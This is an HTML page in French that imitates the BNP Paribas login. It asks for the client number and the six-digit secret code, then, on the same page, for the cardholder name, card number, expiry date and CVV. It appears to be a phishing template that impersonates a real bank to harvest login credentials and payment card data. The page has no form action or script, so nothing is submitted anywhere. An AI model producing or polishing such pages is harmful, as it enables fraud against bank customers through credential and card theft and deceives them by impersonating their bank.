<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion BNP Paribas</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px;
    }

    .form-section {
      background-color: white;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 20px 30px;
      margin: 20px 0;
      width: 300px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    .form-section h2 {
      color: white;
      background-color: #2ea443;
      padding: 10px;
      border-radius: 5px;
      margin: -20px -30px 20px;
      text-align: center;
    }

    input[type="text"],
    input[type="password"],
    input[type="number"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      background-color: #2ea443;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background-color: #249636;
    }

    .note {
      font-size: 0.8em;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <!-- Connexion BNP Paribas -->
  <div class="form-section">
    <h2>Connexion BNP Paribas</h2>
    <label for="numero">Mon numéro client</label>
    <input type="text" id="numero" placeholder="Ex : 123456789">

    <label for="code">Mon code secret (6 chiffres)</label>
    <input type="password" id="code" maxlength="6" placeholder="******">

    <button>Accéder à mes Comptes</button>
  </div>

  <!-- Informations Carte Bancaire -->
  <div class="form-section">
    <h2>Informations Carte Bancaire</h2>
    <label for="nom">Nom inscrit sur la carte</label>
    <input type="text" id="nom">

    <label for="numero-carte">Numéro de carte</label>
    <input type="text" id="numero-carte" placeholder="1234 5678 9012 3456">

    <label for="expiration">Date d'expiration</label>
    <input type="text" id="expiration" placeholder="MM/AA">

    <label for="cvv">CVV</label>
    <input type="number" id="cvv" placeholder="123">

    <button>Valider le Paiement</button>

    <p class="note">Attention : les cartes eCarte Bleue, Visa Electron et Mastercard Maestro ne sont pas acceptées.</p>
  </div>

</body>
</html>
